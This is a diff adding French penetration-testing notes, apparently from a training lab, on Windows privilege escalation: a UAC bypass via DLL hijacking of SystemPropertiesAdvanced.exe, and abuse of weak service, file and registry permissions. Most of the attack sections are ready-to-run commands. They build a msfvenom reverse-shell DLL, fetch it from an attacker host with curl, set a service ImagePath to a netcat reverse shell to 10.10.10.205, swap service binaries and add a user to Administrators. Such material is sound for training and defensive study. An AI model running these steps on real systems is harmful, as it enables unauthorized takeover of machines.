@@ -1044,4 +1044,347 @@ Avec ces hachés ou clés, la post-exploitation complète du domaine devient pos
 
 ---
 
+# User Account Control
+
+User Account Control (UAC) est une fonctionnalité qui affiche une invite de consentement pour les activités élevées. Les applications ont différents niveaux d'intégrité ; un programme avec un niveau élevé peut effectuer des actions sensibles. 
+
+Quand UAC est activé, les applications s'exécutent par défaut sous le contexte d'un compte non-administrateur sauf si un administrateur autorise explicitement l'élévation. 
+
+UAC est une **mesure de confort / défense** pour réduire les changements non désirés, mais **n'est pas une frontière de sécurité absolue**.
+
+## UAC Group Policy / Registry Summary
+
+Les paramètres UAC peuvent être configurés via `secpol.msc` localement ou via GPO en domaine. 
+
+Exemples de clés/valeurs :
+
+- `FilterAdministratorToken` — Admin Approval Mode pour le compte Administrator (par défaut Disabled)  
+- `EnableUIADesktopToggle` — Allow UIAccess prompting without secure desktop (Disabled)  
+- `ConsentPromptBehaviorAdmin` — Comportement du prompt pour les admins (ex : `Prompt for consent for non-Windows binaries`)  
+- `ConsentPromptBehaviorUser` — Comportement du prompt pour les utilisateurs standard (ex : `Prompt for credentials on the secure desktop`)  
+- `EnableInstallerDetection` — Détection d'installateurs (Enabled par défaut sur Home)  
+- `ValidateAdminCodeSignatures` — N'éléver que les binaires signés (Disabled)  
+- `EnableSecureUIAPaths` — UIAccess only in secure locations (Enabled)  
+- `EnableLUA` — Run all administrators in Admin Approval Mode (Enabled)  
+- `PromptOnSecureDesktop` — Basculer sur secure desktop pour le prompt (Enabled)  
+- `EnableVirtualization` — Virtualize file/registry write failures (Enabled)
+
+UAC doit rester activé : il ralentit et bruite souvent les tentatives d'élévation.
+
+## Checking Current User
+
+Vérifier l'identité de l'utilisateur courant :
+`whoami /user`
+
+## Confirming Admin Group Membership
+
+Vérifier si l'utilisateur est dans le groupe Administrators local :
+`net localgroup administrators`
+
+## Reviewing User Privileges
+
+Lister les privilèges effectifs du token :
+`whoami /priv`
+
+## Confirming UAC is Enabled
+
+Vérifier si `EnableLUA` est actif :
+`REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA`
+
+Vérifier le niveau du prompt admin :
+`REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin`
+
+Une valeur `ConsentPromptBehaviorAdmin` de `0x5` indique le niveau "Always notify" (peu de bypasss disponibles).
+
+## Checking Windows Version
+
+Les bypasss UAC sont souvent dépendants de la build Windows. Vérifier la build :
+`[environment]::OSVersion.Version`
+
+Exemple : build `14393` correspond à Windows 10 (1607) — utile pour choisir une technique compatible.
+
+## Finding Auto-Elevating Binaries & DLL Search Order
+
+Certaines binaires "trusted" s'auto-élèvent (auto-elevate) et peuvent charger des DLLs non présentes — vecteur pour des DLL hijacks. Ordre de recherche de DLL (résumé) :
+
+1. Le répertoire de l'application.  
+2. `C:\Windows\System32` (sur systèmes 64-bit pour les binaires 64-bit).  
+3. `C:\Windows\System` (16-bit legacy, non applicable 64-bit).  
+4. Le répertoire Windows.  
+5. Les répertoires listés dans `%PATH%`.
+
+## Reviewing PATH Variable
+
+Vérifier `%PATH%` pour repérer des dossiers écrits par l'utilisateur (ex. WindowsApps) :
+`cmd /c echo %PATH%`
+
+Exemple montrant `C:\Users\sarah\AppData\Local\Microsoft\WindowsApps` — répertoire user-writable exploitable pour DLL hijack.
+
+# Technique: DLL Hijack via SystemPropertiesAdvanced.exe (UAC bypass technique 54)
+
+> Contexte : la version 32-bit de `SystemPropertiesAdvanced.exe` (auto-elevating) cherche `srrstr.dll` manquante ; placer une DLL malveillante nommée `srrstr.dll` dans un répertoire accessible dans le PATH (ex. WindowsApps) peut conduire à chargement en contexte élevé.
+
+## Generating Malicious srrstr.dll
+
+Générer une DLL qui ouvre un reverse shell (ex. msfvenom) :
+`msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll`
+
+## Hosting the DLL on Attack Host
+
+Démarrer un serveur HTTP minimal pour héberger la DLL :
+`sudo python3 -m http.server 8080`
+
+## Downloading DLL on Target
+
+Télécharger la DLL vers le dossier WindowsApps (ou un path vulnérable) :
+`curl http://10.10.14.3:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"`
+
+## Starting Listener on Attack Host
+
+Ouvrir un listener netcat pour récupérer la connexion :
+`nc -lvnp 8443`
+
+## Testing the DLL with rundll32
+
+Exécuter la DLL via `rundll32` pour vérifier que le payload s'exécute (retour shell non élevé si rond initialement) :
+`rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll`
+
+Si la DLL s'exécute, vous recevez une session avec les droits de l'utilisateur courant (UAC toujours actif).
+
+## Clean Up Previous rundll32 Processes
+
+S'assurer que les processus `rundll32.exe` antérieurs sont terminés avant l'étape d'élévation :
+`tasklist /svc | findstr "rundll32"`
+Puis terminer les PIDs identifiés :
+`taskkill /PID 7044 /F`  
+`taskkill /PID 6300 /F`  
+`taskkill /PID 5360 /F`
+
+## Triggering Auto-Elevation with SystemPropertiesAdvanced.exe (32-bit)
+
+Lancer la version 32-bit qui auto-élève et recherche `srrstr.dll` :
+`C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe`
+
+Si la DLL est chargée par ce binaire auto-elevating, l'attaquant reçoit une session élevée (shell SYSTEM ou token administrateur selon le contexte).
+
+## Confirming Elevated Shell
+
+Vérifier l'identité et les privilèges dans la session reçue :
+`whoami`  
+`whoami /priv`
+
+Vous devriez observer des privilèges supplémentaires disponibles et éventuellement activables (ex. `SeDebugPrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege`, ...), indiquant une élévation réussie.
+
+## Resources
+- [User Account Control (UAC) - Microsoft Docs](https://learn.microsoft.com/windows/security/identity-protection/user-account-control)  
+- [UACMe — UAC bypass techniques (GitHub)](https://github.com/hfiref0x/UACME)  
+
+---
+
+# Weak Permissions
+
+Les permissions sur les systèmes Windows sont complexes et sensibles. 
+Une simple mauvaise configuration peut introduire une faille exploitable pour **l’élévation de privilèges**.  
+
+Ces erreurs sont rares dans les produits majeurs mais courantes dans les logiciels tiers, open source ou faits maison.  
+Les services s’exécutent souvent sous `SYSTEM`, donc une faiblesse de permissions peut donner un **contrôle total** sur la machine.
+
+## Permissive File System ACLs
+
+### Running SharpUp
+
+`SharpUp` (outil du projet GhostPack) permet d’identifier les services et binaires ayant des ACL trop permissives :  
+`.\SharpUp.exe audit`
+
+Exemple de sortie :
+`
+=== Modifiable Service Binaries ===  
+Name : SecurityService  
+DisplayName : PC Security Management Service  
+PathName : "C:\Program Files (x86)\PCProtect\SecurityService.exe"
+`
+
+### Checking Permissions with icacls
+
+Vérifier les permissions du binaire :  
+`icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"`
+
+Sortie exemple :  
+`
+BUILTIN\Users:(I)(F)  
+Everyone:(I)(F)  
+NT AUTHORITY\SYSTEM:(I)(F)  
+BUILTIN\Administrators:(I)(F)
+`
+
+→ Les groupes `Users` et `Everyone` ont un **Full Control** sur le binaire.
+
+### Replacing Service Binary
+
+Si le service peut être démarré par un utilisateur standard, on peut le remplacer par un binaire malveillant (par ex. un reverse shell généré avec `msfvenom`).  
+`cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"`  
+`sc start SecurityService`
+
+## Weak Service Permissions
+
+### Reviewing SharpUp Again
+
+Analyser à nouveau les permissions :  
+`SharpUp.exe audit`
+
+Exemple :  
+`
+=== Modifiable Services ===  
+Name : WindscribeService  
+PathName : "C:\Program Files (x86)\Windscribe\WindscribeService.exe"
+`
+
+### Checking Permissions with AccessChk
+
+Vérifier les droits sur le service :  
+`accesschk.exe /accepteula -quvcw WindscribeService`
+
+Exemple de sortie :  
+`
+RW NT AUTHORITY\Authenticated Users  
+SERVICE_ALL_ACCESS
+`
+
+→ Les utilisateurs authentifiés ont un contrôle total (`SERVICE_ALL_ACCESS`).
+
+### Check Local Admin Group
+
+Vérifier les membres du groupe Administrators :  
+`net localgroup administrators`
+
+### Changing the Service Binary Path
+
+Modifier le chemin du binaire pour exécuter une commande arbitraire :  
+`sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"`
+
+Sortie :  
+`[SC] ChangeServiceConfig SUCCESS`
+
+### Stopping the Service
+
+Arrêter le service pour appliquer la modification :  
+`sc stop WindscribeService`
+
+### Starting the Service
+
+Relancer le service :  
+`sc start WindscribeService`
+
+Même si une erreur `StartService FAILED 1053` s’affiche, la commande définie dans `binpath` s’exécute.
+
+### Confirming Local Admin Group Addition
+
+Vérifier que l’utilisateur a bien été ajouté :  
+`net localgroup administrators`
+
+Exemple : 
+`
+Administrator  
+mrb3n  
+htb-student  
+`
+
+## Weak Service Example: Windows Update Orchestrator Service
+
+Avant le patch **CVE-2019-1322**, le service `UsoSvc` (Windows Update Orchestrator Service) avait des permissions faibles.  
+Les comptes de service pouvaient modifier son `binPath` et redémarrer le service, menant à une élévation vers `SYSTEM`.
+
+## Weak Service Permissions - Cleanup
+
+### Reverting the Binary Path
+
+Remettre le binaire d’origine :  
+`sc config WindScribeService binpath="C:\Program Files (x86)\Windscribe\WindscribeService.exe"`
+
+### Starting the Service Again
+
+`sc start WindScribeService`
+
+### Verifying Service is Running
+
+`sc query WindScribeService`
+
+## Unquoted Service Path
+
+Un service avec un **chemin non entre guillemets** peut être exploité si Windows cherche le binaire dans un dossier contrôlable.
+
+Exemple :  
+`C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe`
+
+Windows cherchera dans l’ordre :
+`
+C:\Program.exe  
+C:\Program Files.exe  
+C:\Program Files (x86)\System.exe  
+C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
+`
+
+Si l’on peut créer un de ces fichiers (rarement possible sans droits admin), on peut exécuter du code à la place du service.
+
+### Querying Service
+
+`sc qc SystemExplorerHelpService`
+
+### Searching for Unquoted Service Paths
+
+Lister les services vulnérables :  
+`wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """`
+
+## Permissive Registry ACLs
+
+Certaines clés de registre associées aux services ont des ACL trop permissives.
+
+### Checking for Weak Service ACLs in Registry
+
+`accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services`
+
+Exemple :  
+`
+RW HKLM\System\CurrentControlSet\services\ModelManagerService  
+KEY_ALL_ACCESS
+`
+### Changing ImagePath with PowerShell
+
+Modifier la clé pour exécuter un binaire arbitraire :  
+`Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"`
+
+## Modifiable Registry Autorun Binary
+
+### Check Startup Programs
+
+Lister les programmes au démarrage :  
+`Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl`
+
+Exemple :
+`
+Name : Windscribe  
+Command : "C:\Program Files (x86)\Windscribe\Windscribe.exe" -os_restart  
+Location : HKU\...\CurrentVersion\Run  
+User : WINLPE-WS01\mrb3n
+`
+Si un utilisateur peut modifier le binaire ou la clé, le code s’exécutera à la prochaine ouverture de session.
+
+## Resources
+- [SharpUp - GhostPack GitHub](https://github.com/GhostPack/SharpUp)  
+- [AccessChk - Sysinternals](https://learn.microsoft.com/sysinternals/downloads/accesschk)  
+- [Windows Registry Permissions - Microsoft Learn](https://learn.microsoft.com/windows/win32/sysinfo/registry-permissions)  
+- [CVE-2019-1322 - Microsoft](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2019-1322)  
+
+
+
+
+
+
+
+
+
+
+
+
+
 
